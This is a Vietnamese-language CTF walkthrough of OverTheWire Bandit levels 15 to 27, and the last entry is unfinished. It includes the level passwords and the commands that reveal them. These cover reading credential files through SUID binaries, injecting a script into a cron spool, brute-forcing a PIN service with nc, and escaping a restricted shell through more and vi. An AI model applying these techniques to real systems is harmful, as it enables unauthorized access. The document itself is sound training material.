* **Password Bandit 15:** `pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7`

---

### 🔹 Bandit Level 15 ➜ Level 16

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit15` bằng mật khẩu vừa tìm được. Mật khẩu cho `bandit16` được lấy bằng cách gửi mật khẩu của `bandit15` tới **cổng 30001 trên localhost** sử dụng **mã hóa SSL/TLS** (`port 30001 on localhost using SSL/TLS encryption`).

#### 2. Thách thức kỹ thuật & Mã hóa SSL/TLS với OpenSSL
* **Khác biệt so với Level 14:** Cổng 30000 ở level trước sử dụng kết nối văn bản thuần túy (plaintext TCP), do đó `nc` thông thường hoạt động tốt. Tuy nhiên, cổng 30001 yêu cầu **kết nối được mã hóa TLS/SSL**. Nếu dùng `nc` thông thường, server sẽ từ chối hoặc không phản hồi đúng dữ liệu mã hóa.
* **Công cụ OpenSSL (`openssl s_client`):** 
  * OpenSSL cung cấp lệnh `s_client` đóng vai trò là một client kết nối SSL/TLS tổng quát tới các server hỗ trợ mã hóa.
  * Cú pháp kết nối cơ bản:
    ```bash
    openssl s_client -connect <host>:<port>
    # Cụ thể: openssl s_client -connect localhost:30001
    ```
  * Cờ `-ign_eof` (Ignore EOF) hoặc cờ `-quiet` có thể hữu ích để giữ phiên kết nối ổn định khi truyền dữ liệu qua pipe:
    ```bash
    openssl s_client -quiet -connect localhost:30001
    ```

#### 3. Quá trình thực hiện (Walkthrough)
1. **Kiểm tra mật khẩu của level hiện tại (`bandit15`):**
   ```bash
   cat /etc/bandit_pass/bandit15
   # Output: pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7
   ```

2. **Gửi mật khẩu tới cổng 30001 qua OpenSSL (`s_client`):**
   ```bash
   cat /etc/bandit_pass/bandit15 | openssl s_client -quiet -connect localhost:30001
   ```
   *Server thực hiện bắt tay TLS thành công và phản hồi:*
   ```text
   Connecting to 127.0.0.1
   ...
   Correct!
   kS0Hf0u5HiXFwKMKFqXvPdOTNGGa0X8V
   ```

#### 4. Kết quả & Password thu được
* **Password Bandit 16:** `kS0Hf0u5HiXFwKMKFqXvPdOTNGGa0X8V`

---

### 🔹 Bandit Level 16 ➜ Level 17

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit16` bằng mật khẩu vừa tìm được. Tìm thông tin xác thực (credentials/password hoặc private key) cho `bandit17` bằng cách gửi mật khẩu của `bandit16` tới **một cổng trên localhost trong dải từ 31000 đến 32000**.
* Bước 1: Quét để tìm xem các cổng nào trong dải 31000 - 32000 đang mở (listening).
* Bước 2: Xác định cổng nào trong số đó sử dụng **SSL/TLS** và cổng nào không.
* Bước 3: Tìm đúng cổng dịch vụ cấp credentials (chỉ có 1 server cung cấp credentials, các server khác chỉ là echo server trả lại dữ liệu gửi đến).

#### 2. Thách thức kỹ thuật & Công cụ quét cổng (`nmap`)
* **Công cụ Nmap:** `nmap` là công cụ quét mạng và đánh giá bảo mật hàng đầu.
  * Quét dải cổng cụ thể: `nmap -p 31000-32000 localhost`
  * Quét phát hiện phiên bản dịch vụ và SSL: `nmap -p 31000-32000 -sV --script ssl-enum-ciphers localhost` (hoặc `nmap -sV -p 31000-32000 localhost`)
* **Gửi dữ liệu tới dịch vụ SSL:**
  * Dùng `openssl s_client -connect localhost:<port_ssl>` hoặc `openssl s_client -ign_eof -connect localhost:<port_ssl>`.

#### 3. Quá trình thực hiện (Walkthrough)
1. **Quét tìm các cổng mở và phát hiện phiên bản dịch vụ:**
   ```bash
   nmap -sV -p 31000-32000 localhost
   ```
   *Kết quả quét Nmap phát hiện 5 cổng:*
   * `31046/tcp` open echo
   * `31518/tcp` open ssl/echo
   * `31691/tcp` open echo
   * **`31790/tcp` open ssl/unknown** *(Banner phản hồi: "Wrong! Please enter the correct current password.")*
   * `31960/tcp` open echo

2. **Gửi mật khẩu Bandit 16 tới cổng SSL 31790 qua OpenSSL:**
   ```bash
   cat /etc/bandit_pass/bandit16 | openssl s_client -ign_eof -connect localhost:31790
   ```
   *Server xác thực mật khẩu thành công và trả về mã khóa SSH Private Key (`OpenSSH Private Key`).*

3. **Lưu Private Key và thiết lập phân quyền an toàn:**
   * Lưu đoạn mã khóa vào file `bandit17.key` (hoặc `~/.bandit17.key` trên Linux/WSL).
   * Phân quyền bảo mật `chmod 600`:
     ```bash
     chmod 600 ~/.bandit17.key
     ```
   * Đăng nhập SSH vào `bandit17`:
     ```bash
     ssh -i ~/.bandit17.key bandit17@bandit.labs.overthewire.org -p 2220
     ```

#### 4. Kết quả & Password thu được
* **Thông tin xác thực Bandit 17:** Khóa xác thực `SSH Private Key` (OpenSSH RSA/ED25519 Key).

---

### 🔹 Bandit Level 17 ➜ Level 18

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit17` bằng SSH Private Key vừa thu được. Trong thư mục home có 2 file: **`passwords.old`** và **`passwords.new`**. Mật khẩu cho `bandit18` nằm trong file **`passwords.new`** và là **dòng duy nhất có sự thay đổi giữa 2 file `passwords.old` và `passwords.new`**.

#### 2. Thách thức kỹ thuật & So sánh tập tin bằng lệnh `diff`
* **Lệnh `diff`:** So sánh nội dung giữa hai tập tin theo từng dòng.
  * Cú pháp cơ bản:
    ```bash
    diff passwords.old passwords.new
    ```
  * Ký hiệu đầu ra của `diff`:
    * `<` : Dòng thuộc file thứ nhất (`passwords.old`).
    * `>` : Dòng thuộc file thứ hai (`passwords.new`) — Đây chính là mật khẩu mới cần tìm!
* **Các phương pháp thay thế:**
  * Kết hợp sắp xếp và lọc dòng đơn nhất: `sort passwords.old passwords.new | uniq -u`
  * Dùng `comm`: `comm -3 <(sort passwords.old) <(sort passwords.new)`

#### 3. Quá trình thực hiện (Walkthrough)
1. **Đăng nhập vào Bandit 17 bằng SSH Private Key:**
   ```bash
   ssh -i ~/.bandit17.key bandit17@bandit.labs.overthewire.org -p 2220
   ```

2. **So sánh sự khác biệt giữa hai tệp tin `passwords.old` và `passwords.new`:**
   ```bash
   diff passwords.old passwords.new
   ```
   *Kết quả trả về:*
   ```text
   42c42
   < qOg5pVOjPx9x9VccyYBADiT4xxyoUB8D
   ---
   > OQxXZjELndr90zuhOTDYBEomI0SZITXI
   ```
   *Dòng có dấu `>` là dòng mới được sửa đổi trong file `passwords.new`.*

#### 4. Kết quả & Password thu được
* **Password Bandit 18:** `OQxXZjELndr90zuhOTDYBEomI0SZITXI`

---

### 🔹 Bandit Level 18 ➜ Level 19

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit18` bằng mật khẩu vừa tìm được. Tìm mật khẩu cho `bandit19` được lưu trong file **`readme`** tại thư mục home.
* Thử thách: Ai đó đã chỉnh sửa file cấu hình khởi động shell **`.bashrc`** của tài khoản `bandit18` để tự động thoát ngay lập tức khi đăng nhập (`logout` / `exit`) và hiển thị thông báo `Byebye !`.

#### 2. Thách thức kỹ thuật & Cơ chế SSH Non-Interactive Execution
* **Cơ chế SSH và `.bashrc`:**
  * Khi người dùng mở một phiên SSH tương tác (Interactive Login Shell), hệ điều hành sẽ tự động nạp và thực thi các script khởi tạo như `~/.bashrc` hoặc `~/.profile`.
  * Vì file `.bashrc` chứa lệnh `exit` hoặc `logout`, phiên SSH sẽ bị đóng ngay lập tức khi vừa kết nối.
* **Kỹ thuật vượt qua (Bypass `.bashrc` logout):**
  * **Chạy lệnh trực tiếp qua SSH:** Thay vì mở một interactive shell đầy đủ, sếp có thể truyền trực tiếp lệnh cần thực thi ở cuối câu lệnh `ssh`. Khi đó, SSH sẽ chạy lệnh đó trong môi trường Non-interactive (không nạp `.bashrc`) và trả về output rồi tự động ngắt kết nối:
    ```bash
    ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat readme"
    ```
  * **Chạy shell không nạp profile/rc:**
    ```bash
    ssh bandit18@bandit.labs.overthewire.org -p 2220 "/bin/bash --noprofile --norc"
    # hoặc gọi pseudo-terminal:
    ssh -t bandit18@bandit.labs.overthewire.org -p 2220 "/bin/sh"
    ```

#### 3. Quá trình thực hiện (Walkthrough)
1. **Chạy lệnh đọc file trực tiếp qua SSH non-interactive:**
   ```bash
   ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat readme"
   ```
2. **Nhập mật khẩu Bandit 18:** `OQxXZjELndr90zuhOTDYBEomI0SZITXI`
3. **Kết quả in ra trực tiếp trên terminal:** Mật khẩu của `bandit19` được hiển thị mà không bị `.bashrc` đóng phiên làm việc.

#### 4. Kết quả & Password thu được
* **Password Bandit 19:** `KpsOfPkcP7i1FlIExk2QEjyt6dw8dxZI`

---

### 🔹 Bandit Level 19 ➜ Level 20

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit19` bằng mật khẩu vừa tìm được. Trong thư mục home có một file thực thi đặc biệt mang tên **`bandit20-do`**. Sử dụng file này để tìm mật khẩu cho `bandit20` được lưu tại vị trí chuẩn quen thuộc: **`/etc/bandit_pass/bandit20`**.

#### 2. Thách thức kỹ thuật & Cơ chế SUID (Set User ID) trong Linux
* **SUID (Set User ID) là gì?**
  * SUID là một cờ phân quyền đặc biệt trên Linux/Unix (ký hiệu chữ `s` trong quyền thực thi của Owner, ví dụ `-rwsr-x---`).
  * Khi một file thực thi có gắn cờ SUID được chạy bởi bất kỳ người dùng nào, tiến trình đó sẽ được cấp quyền hạn của **chủ sở hữu file (Owner)** thay vì quyền của người đang chạy lệnh.
* **Phân tích quyền hạn của file `bandit20-do`:**
  * Khi gõ `ls -la`, ta thấy:
    ```text
    -rwsr-x--- 1 bandit20 bandit19 14876 ... bandit20-do
    ```
  * Chủ sở hữu file là **`bandit20`**, và nhóm là `bandit19`.
  * Ký hiệu `rws` chỉ ra rằng file này có cờ **SUID**! Bất kỳ lệnh nào được thực thi thông qua `bandit20-do` sẽ chạy dưới danh tính và đặc quyền của user `bandit20`.
* **Cách sử dụng `bandit20-do`:**
  * Khi chạy không có tham số: `./bandit20-do`
    * Sẽ in ra hướng dẫn: `Run a command as another user. Example: ./bandit20-do id`
  * Để đọc file mật khẩu của `bandit20` (vốn dĩ user `bandit19` không có quyền đọc trực tiếp):
    ```bash
    ./bandit20-do cat /etc/bandit_pass/bandit20
    ```

#### 3. Quá trình thực hiện (Walkthrough)
1. **Kiểm tra quyền hạn của file `bandit20-do`:**
   ```bash
   ls -la
   ```
   *Thấy quyền `-rwsr-x--- 1 bandit20 bandit19 14880 ... bandit20-do`.*
2. **Chạy thử chương trình để xem hướng dẫn:**
   ```bash
   ./bandit20-do
   # Output: Run a command as another user. Example: ./bandit20-do whoami
   ```
3. **Kiểm tra Effective User ID (euid):**
   ```bash
   ./bandit20-do id
   # Output: uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
   ```
4. **Đọc mật khẩu của Bandit 20 bằng quyền của `bandit20`:**
   ```bash
   ./bandit20-do cat /etc/bandit_pass/bandit20
   ```

#### 4. Kết quả & Password thu được
* **Password Bandit 20:** `4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA`

---

### 🔹 Bandit Level 20 ➜ Level 21

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit20` bằng mật khẩu vừa tìm được. Trong thư mục home có một file thực thi mang cờ SUID mang tên **`suconnect`**. File này sẽ thực hiện một kết nối TCP tới `localhost` tại một cổng do người dùng chỉ định qua đối số dòng lệnh, đọc mật khẩu gửi tới và so sánh với mật khẩu của level hiện tại (`bandit20`). Nếu mật khẩu đúng, nó sẽ gửi trả về mật khẩu của `bandit21`.

#### 2. Thách thức kỹ thuật & Giao tiếp đa tiến trình (Job Control / Background Processes)
* **Thách thức:** Cần đồng thời thực hiện 2 vai trò:
  1. Mở một cổng lắng nghe (Server Listener) trên `localhost` bằng `nc` và gửi mật khẩu `bandit20` ngay khi có kết nối đến.
  2. Chạy file nhị phân SUID `./suconnect <port>` để nó kết nối (Client) vào đúng cổng vừa mở.
* **Giải pháp:**
  * **Cách 1: Sử dụng 2 cửa sổ SSH song song:**
    * Cửa sổ 1 (Listener): `echo "4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA" | nc -lvnp 44444`
    * Cửa sổ 2 (Client): `./suconnect 44444`
  * **Cách 2: Chạy tiến trình ngầm (Background Job `&` trên cùng 1 terminal):**
    * Mở listener và chạy nền với dấu `&`:
      ```bash
      echo "4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA" | nc -lvnp 44444 &
      ```
    * Ngay sau đó gọi chương trình SUID kết nối vào cổng `44444`:
      ```bash
      ./suconnect 44444
      ```

#### 3. Quá trình thực hiện (Walkthrough)
1. **Mở Terminal 1 - Dựng Server Listener lắng nghe trên cổng 55555:**
   ```bash
   nc -lvnp 55555
   ```
   *Terminal 1 hiển thị trạng thái: `Listening on 0.0.0.0 55555`.*

2. **Mở Terminal 2 - SSH vào `bandit20` và kích hoạt kết nối bằng file SUID:**
   ```bash
   ./suconnect 55555
   ```
   *Ngay khi chạy, `suconnect` kết nối tới cổng 55555 trên localhost.*

3. **Gửi mật khẩu Bandit 20 từ Terminal 1:**
   * Tại Terminal 1 (sau khi nhận thông báo kết nối), dán mật khẩu `4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA` và nhấn `Enter`.

4. **Nhận kết quả trên Terminal 2:**
   * `suconnect` xác thực mật khẩu chính xác và in ra mật khẩu của `bandit21`.

#### 4. Kết quả & Password thu được
* **Password Bandit 21:** `bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY`

---

### 🔹 Bandit Level 21 ➜ Level 22

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit21` bằng mật khẩu vừa tìm được. Một chương trình đang được hệ thống tự động thực thi theo chu kỳ định kỳ thông qua **`cron`** (trình lập lịch tác vụ theo thời gian của Linux). 
* Kiểm tra trong thư mục **`/etc/cron.d/`** để xem cấu hình lập lịch tác vụ.
* Đọc và phân tích lệnh / script nào đang được thực thi để tìm ra mật khẩu cho `bandit22`.

#### 2. Thách thức kỹ thuật & Cơ chế Cron Job trong Linux
* **Cron & Crontab là gì?**
  * `cron` là một tiến trình daemon chạy ngầm trong Linux chuyên trách tự động thực thi các tác vụ (scripts, backup, dọn dẹp log...) theo lịch trình được cấu hình sẵn.
  * Các file cấu hình tác vụ hệ thống thường nằm trong thư mục `/etc/cron.d/`, `/etc/crontab`, `/etc/cron.hourly/`, `/etc/cron.daily/`...
* **Cấu trúc một dòng cấu hình Cron:**
  ```text
  # ┌───────────── phút (0 - 59)
  # │ ┌────────────── giờ (0 - 23)
  # │ │ ┌─────────────── ngày trong tháng (1 - 31)
  # │ │ │ ┌──────────────── tháng (1 - 12)
  # │ │ │ │ ┌───────────────── ngày trong tuần (0 - 6, 0=Chủ nhật)
  # │ │ │ │ │
  # * * * * * <user_chạy_lệnh> <câu_lệnh_hoặc_script>
  ```
  * Ví dụ: `* * * * * bandit22 /usr/bin/cronjob_bandit22.sh` nghĩa là cứ mỗi phút, hệ thống sẽ lấy quyền của user `bandit22` để chạy script `/usr/bin/cronjob_bandit22.sh`.
* **Hướng tiếp cận:**
  1. Liệt kê các file cấu hình cron trong `/etc/cron.d/`.
  2. Đọc nội dung file cấu hình liên quan đến `bandit22`.
  3. Tìm ra đường dẫn tới file script mà cron job thực thi và đọc nội dung script đó (`cat <path_to_script>`).
  4. Script này sẽ để lộ vị trí lưu mật khẩu của `bandit22`.

#### 3. Quá trình thực hiện (Walkthrough)
1. **Kiểm tra các cấu hình Cron Job của hệ thống:**
   ```bash
   cd /etc/cron.d/
   ls -la
   ```
   *Phát hiện file cấu hình `cronjob_bandit22`.*

2. **Đọc nội dung cấu hình Cron Job:**
   ```bash
   cat cronjob_bandit22
   ```
   *Kết quả:*
   ```text
   @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
   * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
   ```
   *Cấu hình cho biết cứ mỗi phút (`* * * * *`), hệ thống mượn quyền `bandit22` để chạy `/usr/bin/cronjob_bandit22.sh`.*

3. **Phân tích nội dung file script thực thi:**
   ```bash
   cat /usr/bin/cronjob_bandit22.sh
   ```
   *Nội dung script:*
   ```bash
   #!/bin/bash
   chmod 644 /tmp/t706lds9S0RqQh9aMcz6ShpAoZKF7fgv
   cat /etc/bandit_pass/bandit22 > /tmp/t706lds9S0RqQh9aMcz6ShpAoZKF7fgv
   ```
   *Script phân quyền `644` (cho phép tất cả mọi người đọc) và sao chép mật khẩu của `bandit22` vào file tạm `/tmp/t706lds9S0RqQh9aMcz6ShpAoZKF7fgv`.*

4. **Đọc file tạm để lấy mật khẩu:**
   ```bash
   cat /tmp/t706lds9S0RqQh9aMcz6ShpAoZKF7fgv
   ```

#### 4. Kết quả & Password thu được
* **Password Bandit 22:** `RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz`

---

### 🔹 Bandit Level 22 ➜ Level 23

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit22` bằng mật khẩu vừa tìm được. Tương tự như bài trước, có một tiến trình `cron` tự động chạy định kỳ trong `/etc/cron.d/`. Nhiệm vụ là phân tích file cấu hình và dịch ngược script shell đang chạy để tính toán ra vị trí file mật khẩu của `bandit23`.

#### 2. Thách thức kỹ thuật & Thuật toán băm MD5 trong Shell Script
* **Thách thức:** Ở level này, người viết script không còn đặt tên file tĩnh như `/tmp/t706lds...` nữa, mà tên file được tạo ra động bằng thuật toán băm **MD5** dựa trên tên của người dùng (`whoami`).
* **Cơ chế băm MD5 (`md5sum`):**
  * MD5 là hàm băm một chiều biến đổi một chuỗi văn bản bất kỳ thành chuỗi hex cố định 32 ký tự.
  * Với cùng một chuỗi đầu vào, MD5 luôn luôn cho ra cùng một kết quả băm duy nhất (tính xác định - deterministic).
* **Hướng tiếp cận:**
  1. Đọc file cấu hình `/etc/cron.d/cronjob_bandit23`.
  2. Đọc nội dung script shell `/usr/bin/cronjob_bandit23.sh`.
  3. Quan sát công thức tạo tên file tạm trong script (ví dụ: `echo I am user $myname | md5sum | cut -d ' ' -f 1`).
  4. Tự thay `$myname` bằng `bandit23`, chạy câu lệnh đó trên terminal để tính ra mã băm tên file đích.
  5. Đọc file `/tmp/<mã_băm_tính_được>` để lấy mật khẩu của **Bandit 23**!

#### 3. Quá trình thực hiện (Walkthrough)
1. **Kiểm tra file cấu hình Cron:**
   ```bash
   cat /etc/cron.d/cronjob_bandit23
   ```
   *Cấu hình cho thấy Cron chạy `/usr/bin/cronjob_bandit23.sh` dưới quyền `bandit23`.*

2. **Phân tích nội dung script `/usr/bin/cronjob_bandit23.sh`:**
   ```bash
   cat /usr/bin/cronjob_bandit23.sh
   ```
   *Nội dung:*
   ```bash
   #!/bin/bash
   myname=$(whoami)
   mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
   echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
   cat /etc/bandit_pass/$myname > /tmp/$mytarget
   ```

3. **Tính toán tên file hash của `bandit23`:**
   * Vì tiến trình Cron chạy ngầm với danh nghĩa `bandit23`, ta thay `$myname` bằng `bandit23`:
   ```bash
   echo I am user bandit23 | md5sum | cut -d ' ' -f 1
   ```
   *Kết quả mã băm sinh ra:* `8ca319486bfbbc3663ea0fbe81326349`

4. **Đọc file mật khẩu được sinh ra trong `/tmp`:**
   ```bash
   cat /tmp/8ca319486bfbbc3663ea0fbe81326349
   ```

#### 4. Kết quả & Password thu được
* **Password Bandit 23:** `gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw`

---

### 🔹 Bandit Level 23 ➜ Level 24

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit23` bằng mật khẩu vừa tìm được. Một tiến trình `cron` tự động chạy định kỳ trong `/etc/cron.d/`. Nhiệm vụ là phân tích script đang chạy, tự viết một Shell Script thực thi của riêng mình và đặt vào thư mục chỉ định để Cron Job của `bandit24` tự động thực thi script đó và đọc mật khẩu cho sếp!

#### 2. Thách thức kỹ thuật & Khai thác Cron Job bằng Shell Script Injection
* **Phân tích cơ chế của Cron Job `/usr/bin/cronjob_bandit24.sh`:**
  * Khi đọc script của level này, ta sẽ thấy:
    ```bash
    cd /var/spool/bandit24/foo
    for i in * .*; do
        if [ "$i" != "." -a "$i" != ".." ]; then
            owner="$(stat --format "%U" ./$i)"
            if [ "${owner}" = "bandit23" ]; then
                timeout -s 9 60 ./$i
            fi
            rm -f ./$i
        fi
    done
    ```
  * Cứ mỗi phút, Cron Job dưới quyền **`bandit24`** sẽ duyệt qua tất cả các file trong thư mục `/var/spool/bandit24/foo`. Nếu file đó thuộc sở hữu của `bandit23`, nó sẽ **thực thi file đó với quyền của `bandit24`**, sau đó xóa file đi.
* **Kỹ thuật tấn công:**
  1. Tạo một thư mục làm việc riêng có toàn quyền trong `/tmp/` (ví dụ `mkdir -p /tmp/my_dir && chmod 777 /tmp/my_dir`).
  2. Tạo một file script shell (ví dụ `/tmp/my_dir/getpass.sh`) với nội dung:
     ```bash
     #!/bin/bash
     cat /etc/bandit_pass/bandit24 > /tmp/my_dir/pass.txt
     ```
  3. Cấp đầy đủ quyền thực thi cho file script (`chmod 777 /tmp/my_dir/getpass.sh`).
  4. Copy script này vào thư mục chờ `/var/spool/bandit24/foo/`.
  5. Đợi Cron Job (tối đa 1 phút) tự động chạy script của sếp dưới quyền `bandit24` và ghi mật khẩu vào `/tmp/my_dir/pass.txt`.
  6. Đọc file `/tmp/my_dir/pass.txt` để lấy mật khẩu!

#### 3. Quá trình thực hiện (Walkthrough)
1. **Tạo thư mục làm việc tạm thời và phân quyền:**
   ```bash
   mkdir /tmp/sc1
   chmod 777 /tmp/sc1
   cd /tmp/sc1
   ```

2. **Tạo file kịch bản khai thác `exploit.sh` và file hứng dữ liệu `pass.txt`:**
   * Viết file `exploit.sh`:
     ```bash
     #!/bin/bash
     cat /etc/bandit_pass/bandit24 > /tmp/sc1/pass.txt
     ```
   * Tạo file `pass.txt` và phân quyền mở hoàn toàn:
     ```bash
     touch pass.txt
     chmod 777 exploit.sh
     chmod 777 pass.txt
     ```

3. **Sao chép kịch bản vào thư mục hàng đợi của Cron Job:**
   ```bash
   cp exploit.sh /var/spool/bandit24/foo/
   ```

4. **Chờ Cron Job thực thi (khoảng 30-60 giây) và đọc kết quả:**
   ```bash
   cat pass.txt
   ```

#### 4. Kết quả & Password thu được
* **Password Bandit 24:** `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv`

---

### 🔹 Bandit Level 24 ➜ Level 25

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit24` bằng mật khẩu vừa tìm được. Một daemon dịch vụ đang lắng nghe trên cổng **`30002`** tại `localhost`. Dịch vụ này sẽ cấp mật khẩu của `bandit25` nếu nhận được đúng định dạng:
```text
<mật_khẩu_bandit24> <mã_PIN_bí_mật_4_chữ_số>
```
Mã PIN là một số có 4 chữ số (từ `0000` đến `9999`). Nhiệm vụ là thực hiện kỹ thuật **Vét cạn (Brute-force)** qua cổng mạng 30002 để tìm ra mã PIN chính xác.

#### 2. Thách thức kỹ thuật & Tự động hóa Brute-force bằng Bash Scripting
* **Cơ chế hoạt động của Daemon:**
  * Khi kết nối qua `nc localhost 30002`, server sẽ in ra banner: `I am the pincode checker for user bandit25...`
  * Nếu nhập sai, server trả về: `Wrong! Please enter the correct pincode. Try again.`
  * Điểm đặc biệt: Server cho phép gửi liên tục các mã PIN trong cùng 1 kết nối duy nhất mà không bị ngắt kết nối!
* **Chiến thuật sinh 10.000 mã PIN (0000 - 9999):**
  * Dùng cú pháp Brace Expansion trong Bash: `{0000..9999}`
  * Ghép mật khẩu `bandit24` với từng mã PIN:
    ```bash
    for i in {0000..9999}; do
        echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i"
    done
    ```
* **Khai thác:**
  * Tạo danh sách 10.000 dòng trong một file tạm hoặc pipe trực tiếp vào Netcat:
    ```bash
    for i in {0000..9999}; do echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i"; done | nc localhost 30002 | grep -v "Wrong"
    ```
  * Lệnh `grep -v "Wrong"` sẽ lọc bỏ 9.999 dòng thông báo sai, chỉ giữ lại duy nhất dòng thông báo thành công và mật khẩu của **Bandit 25**!

#### 3. Quá trình thực hiện (Walkthrough)
1. **Dựng đường ống (Pipeline) sinh 10.000 mã PIN và đẩy qua Netcat:**
   ```bash
   for i in {0000..9999}; do echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i"; done | nc localhost 30002 | grep -v "Wrong"
   ```
2. **Kết quả nhận được từ Server:**
   ```text
   I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
   Correct!
   The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
   ```

#### 4. Kết quả & Password thu được
* **Password Bandit 25:** `SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P`

---

### 🔹 Bandit Level 25 ➜ Level 26

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit25` bằng mật khẩu vừa tìm được. Trong thư mục home của `bandit25` có file SSH private key của `bandit26` (`bandit26.sshkey`). Tuy nhiên, shell mặc định của `bandit26` không phải là `/bin/bash` mà là một custom shell. Nhiệm vụ là tìm hiểu cách hoạt động của shell này và tìm cách thoát khỏi môi trường bị giam cầm (Restricted Shell Breakout).

#### 2. Thách thức kỹ thuật & Kỹ thuật thoát Shell qua `more` và `vi` (Terminal Window Resizing)
* **Khám phá Shell của `bandit26`:**
  * Khi kiểm tra file cấu hình tài khoản hệ thống `/etc/passwd`:
    ```bash
    grep bandit26 /etc/passwd
    # Output: bandit26:x:11026:11026:bandit26:/home/bandit26:/usr/bin/showtext
    ```
  * Shell đăng nhập của `bandit26` là script `/usr/bin/showtext`. Nội dung của script này:
    ```bash
    #!/bin/sh
    export TERM=linux
    more ~/text.txt
    exit 0
    ```
  * Khi SSH vào `bandit26`, hệ thống tự động chạy lệnh `more ~/text.txt` rồi lập tức thoát (`exit 0`).
* **Kẽ hở của trình phân trang `more`:**
  * Lệnh `more` chỉ hiển thị toàn bộ nội dung rồi thoát ngay nếu **chiều cao cửa sổ terminal lớn hơn độ dài của file**.
  * Nhưng nếu **thu nhỏ cửa sổ terminal (chỉ cao khoảng 4-5 dòng)**, `more` sẽ bị ép phải **dừng lại ở chế độ phân trang** (hiển thị thanh trạng thái `--More--(XX%)`).
* **Chuỗi khai thác (Exploit Chain):**
  1. Thu nhỏ cửa sổ terminal xuống rất thấp (khoảng 4-6 dòng).
  2. Kết nối SSH vào `bandit26` bằng file key:
     ```bash
     ssh -i bandit26.sshkey bandit26@localhost -p 2220
     ```
  3. Khi `more` dừng lại, nhấn phím **`v`** để bật trình soạn thảo **`vi`**.
  4. Phóng to cửa sổ terminal trở lại bình thường.
  5. Trong `vi`, thiết lập lại shell và gọi shell tương tác:
     * Gõ: `:set shell=/bin/bash` rồi nhấn `Enter`.
     * Gõ: `:shell` rồi nhấn `Enter`.
  6. Ta sẽ thoát ra ngoài và chiếm được **Full Interactive Bash Shell** của `bandit26`!

#### 3. Quá trình thực hiện (Walkthrough)
1. **Lấy file key `bandit26.sshkey` về môi trường Linux (WSL) và phân quyền:**
   ```bash
   cp /mnt/d/CTF-test/bandit26.sshkey /tmp/bandit26.key
   chmod 600 /tmp/bandit26.key
   ```

2. **Ép kích thước Terminal xuống 5 dòng (để `more` không thể in hết file):**
   ```bash
   stty rows 5 cols 80
   ```

3. **Kết nối SSH trực tiếp vào Bandit 26:**
   ```bash
   ssh -i /tmp/bandit26.key bandit26@bandit.labs.overthewire.org -p 2220
   ```

4. **Khai thác lỗ hổng trong `more` và `vi`:**
   * Màn hình dừng lại ở `--More--(XX%)`.
   * Nhấn phím **`v`** để kích hoạt trình soạn thảo **`vi`**.
   * Đọc file mật khẩu trực tiếp trong `vi`:
     ```text
     :e /etc/bandit_pass/bandit26
     ```
   * Hoặc thoát ra Bash shell hoàn chỉnh:
     ```text
     :set shell=/bin/bash
     :shell
     ```

#### 4. Kết quả & Password thu được
* **Password Bandit 26:** `jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ`

---

### 🔹 Bandit Level 26 ➜ Level 27

#### 1. Mục tiêu (Objective)
Từ phiên làm việc hiện tại của `bandit26`, tìm mật khẩu cho `bandit27` được lưu trong file quen thuộc `/etc/bandit_pass/bandit27`.

#### 2. Thách thức kỹ thuật & File thực thi SUID `bandit27-do`
* **Vấn đề Shell của `bandit26`:**
  * Vì `bandit26` có login shell là script `/usr/bin/showtext`, nếu sếp thoát SSH ra ngoài và đăng nhập lại bằng mật khẩu `jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ`, sếp sẽ lại bị rơi vào vòng lặp `more ~/text.txt`.
  * Do đó, cách tốt nhất là **duy trì phiên làm việc hiện tại từ trong `vi`**, thoát ra **Bash Shell**:
    ```text
    :set shell=/bin/bash
    :shell
    ```
* **Leo thang qua file SUID `bandit27-do`:**
  * Trong thư mục home của `bandit26` có một file thực thi mang tên **`bandit27-do`** có gắn cờ SUID thuộc quyền sở hữu của `bandit27`:
    ```bash
    ./bandit27-do cat /etc/bandit_pass/bandit27
    ```

#### 3. Quá trình thực hiện (Walkthrough)
*(Đang thực hiện...)*

---
